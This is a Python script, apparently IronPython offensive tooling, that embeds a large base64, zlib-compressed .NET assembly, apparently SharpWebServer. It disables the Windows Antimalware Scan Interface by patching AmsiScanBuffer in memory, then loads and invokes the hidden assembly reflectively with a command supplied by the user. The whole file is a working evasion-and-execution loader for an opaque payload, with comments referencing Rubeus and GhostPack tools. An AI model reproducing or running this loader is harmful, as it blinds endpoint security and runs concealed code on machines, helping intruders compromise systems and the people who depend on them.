QgBsev2YWFf3X41ePXrv7XnzkKBqlSs8fXlucFK4zxszPHZ2aOw2BYfRv+evMyagBqbub4CYj6jXlpwEJlzqEisKlv0Bi7dKIyszYHY/GVlVcWoWc4dKpy3Hll9YuZZX5cWKrAqJDwCWQXDi8hy3BwBqLX5la/hiBKmOUFYBVMOo4suvo1NNYBXgFmwRYtLzhqAVsCpAOZtjPzm0/CenDP72+Mmm4Qe35/Zzf0h5EDcDME95mj/lLt3sbOnbDec4d+uPfeYzeMAPDm/tXaRUCx/Bsm6bYXBd36wT14fAXzVExK5eoxR+l/f/rz//Hf8BcLuA9/C4+hUh8m6fjvFZX+93D79vajv/3Zb/7Jn//83r/4792zn59o3cMct69/Vf/q0lfRV9u79TB44ja23XDfDb/yG0+/euh23XrkjiXVglZD/Y3HSXF/jOGKmvrvjx7b1frmlh9ujNytugcTRNT0Q9ettbpdTvx/b6vK70zH8ut/L+nfDPFFBZYgvwW/D+A3ne7QPP3hlHj8NxZp4Hcz4P8XMOjf+6uOas0kKa2Zq/D9WG2rb+B7Qz2E0CZw8T143oTvO8TRSv2bY3/xfzUe+98n8ntMTabeprjHtM64I/b1TSVeG/DvB5Rrh6xrfdJvE+2G//3psX/nII5txR4GeNBzEtM/JJiL5nMVFnsXIf49oK9j4G+rtO9oUg7QH+AXLNjHiv0OE5iLoGclfwogTwP8ptGz2PPgnuJjrQpqzMchAvWE7KfbKnk3A98T6BLeH1Id7yqX1mNddYvWWgcqec8t1+8elXdf4rWng65v/8jlXqX2PqAFMurSaEUfb/V4mz+kPOuKPXd7tKQ+gNoV5TvWdNSfW8zxFz//tzc+GfW6lX2RvOcu1S6eq7j9pt/y+p2b5x7t3Kl+eK4SxfV+q971++7NcwdudO6Tj0+eOHniRj2K3F6je1ABFP3o5rlB2L8eNXfdXj2q9rxm6Ed+O642/d71etSr7V86V+nV+17bjeLHdnmArFIxyDZbbj/24oNUnfBzrtIHmX/z3NbBehB0vWYdJ5VaPQjOXWAMcTiI4s1+2y9Zn8tcMuSM3OYghDLlGWJC99kA6um2HoTevtd1O25UEuuVcwaLjQeke3OANb7r7rvdShe/b56rR5v9fX/PDc9VBt56s+lGUEC73o1caRQhuTClNrrqF1J1v3HBEAGeb1zQRP14Qlz8+t8DR30Pfv7JB7/sivz63y/j3/8HJUTC4A=="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpWebServer.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()